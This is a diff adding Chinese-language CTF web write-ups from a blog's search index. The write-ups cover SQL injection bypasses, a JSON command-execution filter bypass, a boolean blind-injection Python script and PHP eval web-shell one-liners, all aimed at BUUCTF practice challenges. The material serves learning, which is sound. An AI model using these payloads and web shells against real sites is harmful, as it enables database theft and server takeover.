@@ -1004,4 +1004,135 @@ fputs(fopen('shell.php','w'),'<?php @eval($_POST['df']); ?><p>‘);</p>
 
 ]]></content>
   </entry>
+  <entry>
+    <title>做题笔记</title>
+    <url>/2023/01/08/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-1/</url>
+    <content><![CDATA[<p>[RootersCTF2019]babyWeb</p>
+<p>1.打开网页有一个输入框，有一句banned words and characters <strong>UNION SLEEP ‘ “ OR - BENCHMARK</strong>，意思就是union、sleep、’、”、or、-、benchmark被过滤</p>
+<p>2.然后当使用1 order by 3时进行了报错，而1 order by 2没有，那就是有两个字段，但是union被过滤，不能使用联合注入，先试着使用报错型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select database())))#</span><br></pre></td></tr></table></figure>
+
+<p>回显了sql_injection</p>
+<p>再使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#</span><br></pre></td></tr></table></figure>
+
+<p>回显了users</p>
+<p>3，使用的是万能密码</p>
+<p>使用payload<br>1 || 1 limit 0,1</p>
+<p>当使用select * from user where name &#x3D; 1时只会返回一条数据</p>
+<p>但当使用select * from user where name &#x3D; 1 || 1就会返回所有的数据，然后再使用limit来进行返回数据条数的限制</p>
+<p> [ACTF2020 新生赛]BackupFile</p>
+<p>1.发现Try to find out source file!</p>
+<p>2.扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://7b49096a-9e5f-4761-9833-73968554eb04.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
+
+<p>得到index.php.bak文件，进行打开，然后下载得到源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">  $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">  if(!is_numeric($key)) &#123;</span><br><span class="line">    exit(&quot;Just num!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $key = intval($key);</span><br><span class="line">$str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">if($key == $str) &#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">  echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>is_numeric函数是如果指定的变量是数字和数字字符串则返回 TRUE，否则返回FALSE。</p>
+<p>intval是函数用于获取变量的整数值。</p>
+<p>是弱比较绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?key=123</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>做题笔记-2</title>
+    <url>/2023/01/11/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0-2-1/</url>
+    <content><![CDATA[<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>1.打开网页看到<code>Enter command as JSON</code>，意思是<code>输入命令作为 JSON</code></p>
+<p>2.源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以利用的传参是cmd，看到有一个<code>preg_match</code>进行匹配，看wp可以用<code>%0a</code>进行绕过，因为<code>preg_match()函数</code>只能匹配第一行数据，而<code>%0a</code>是换行符，但因为会匹配<code>\x00-\x1FA</code>，所以会匹配一个<code>%0a</code>，可以多写一个来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">if ($cmd !== NULL) &#123;</span><br><span class="line">  system($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;Invalid input&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>需要给json中的cmd进行赋值，然后就会执行<code>system($cmd);</code></p>
+<p>3.使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;ls /&quot;&#125;%0a%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>因为需要使用cat命令，但源码中有<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，意思是环境变量引用的是<code>/home/rceservice/jail</code>里面的，由于文件太多不知道flag在哪里，需要使用find命令，而find命令在<code>/usr/bin/</code>里面所以payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;&#125;%0a%0a</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">中有一条/home/rceservice/flag</span><br></pre></td></tr></table></figure>
+
+<p>所以可以知道flag文件的路径，然后就是使用cat命令来返回内容，但cat命令在bin目录下，所以payload是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?cmd=%0a%0a&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125;%0a%0a</span><br></pre></td></tr></table></figure>
+
+<p>可以得到flag</p>
+<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>打开网页源代码，有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过base32和base64解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>2，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27;union select 1,2,database()#&amp;pw=1</span><br></pre></td></tr></table></figure>
+
+<p>发现database()被过滤</p>
+<p>3.看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	function stripslashes_deep($value)</span><br><span class="line">	&#123;</span><br><span class="line">		$value = is_array($value) ?</span><br><span class="line">		array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">		stripslashes($value);</span><br><span class="line">		return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">	$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">	$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">	$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">	die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	if (!$result) &#123;</span><br><span class="line">		printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">		$arr = mysqli_fetch_row($result);</span><br><span class="line">		// print_r($arr);</span><br><span class="line">		if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				die(&quot;wrong pass!&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			die(&quot;wrong user!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">			if(md5($password) == $arr[2])&#123;</span><br><span class="line">				echo $flag;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先得让$arr[1]等于admin，还得让md5后的$password等于$arr[2]</p>
+<p>4.当使用<code>select * from user where username =&#39;1&#39; union select 1,2,3#</code>的时候，当没有&#96;username &#x3D;’1’时，返回select 1,2,3</p>
+<p>所以可以给name传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,3#</span><br></pre></td></tr></table></figure>
+
+<p>符合第一个条件</p>
+<p>再给name传123  md5编码后的202cb962ac59075b964b07152d234b70</p>
+<p>然后给password传123</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27;#&amp;pw=123</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>做题笔记2</title>
+    <url>/2023/01/16/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B02/</url>
+    <content><![CDATA[<p>[强网杯 2019]随便注</p>
+<p>单引号闭合</p>
+<p>使用1’ or 1&#x3D;1;#发现输出所有内容</p>
+<p>发现本题过滤关键字：&#x2F;select|update|delete|drop|insert|where|.而且不区分大小写<br>所以使用堆叠注入</p>
+<p>1’;show tables  – q<br>1’; show columns from 1919810931114514  – q 在数字表中发现有flag字段</p>
+<p>words表里有两个属性，即两列：id 和data<br>而1919810931114514表里只有一个属性列<br>说明输入框可能查询的就是words表<br>后台sql语句可能为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,data from words where id=</span><br></pre></td></tr></table></figure>
+
+<p>在words表中 1’; show columns from words– q<br>直接出现表的内容<br>所以可以借助words表来查191表中的内容</p>
+<p>所以对191进行重新命名</p>
+<p>创建id列，把flag改为data列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;12&#x27;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</span><br></pre></td></tr></table></figure>
+
+<p>然后使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1;#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>[CISCN2019 总决赛 Day2 Web1]Easyweb</p>
+<p>在image.php页面有id，sql注入</p>
+<p>由于备份了网页，访问image.php.bak得到源代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>
+
+<p>addslashes增加斜杠</p>
+<p>增加斜杠后转义</p>
+<p>也就相当于去掉了\0，所以输入\\0，就会留下一个\转义’</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27;4444&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>所以在4444这里放格式为or ……. #的盲注的语句</p>
+<p>因为没有回显，正确的时候会显示图片，所以使用脚本进行布尔盲注</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url = <span class="string">&quot;http://6504d15a-1bf7-4b7d-90cd-52a252fd07b0.node4.buuoj.cn:81/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line">payload = <span class="string">&quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low+high) // <span class="number">2</span></span><br><span class="line">    <span class="comment"># print(mid)</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        r = requests.get(url + payload.<span class="built_in">format</span>(i,mid))</span><br><span class="line">       <span class="comment"># print(url + payload.format(i,mid))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;JFIF&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获得admin的密码</p>
+<p>上传文件之后会将我们的用户名和文件名写入一个php文件</p>
+<p>禁止php<br>可以用PHP的短标签绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以执行命令</p>
+<p><img src="/2023/01/16/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B02/nn.jpg" alt="题图"></p>
+<p><img src="/2023/01/16/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B02/nnn.jpg" alt="题图"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>做题笔记11</title>
+    <url>/2023/01/18/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B011/</url>
+    <content><![CDATA[]]></content>
+  </entry>
 </search>
